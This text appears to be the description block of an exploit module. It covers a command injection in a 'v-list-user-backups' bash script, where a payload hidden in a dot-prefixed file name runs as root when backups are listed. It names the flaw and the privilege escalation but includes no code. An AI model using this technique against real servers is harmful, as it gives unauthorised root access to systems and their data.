        This module exploits command injection vulnerability in v-list-user-backups bash script file.
        Low privileged authenticated users can execute arbitrary commands under the context of the root user.

        An authenticated attacker with a low privileges can inject a payload in the file name starts with dot.
        During the user backup process, this file name will be evaluated by the v-user-backup bash scripts. As
        result of that backup process, when an attacker try to list existing backups injected payload will be
        executed.
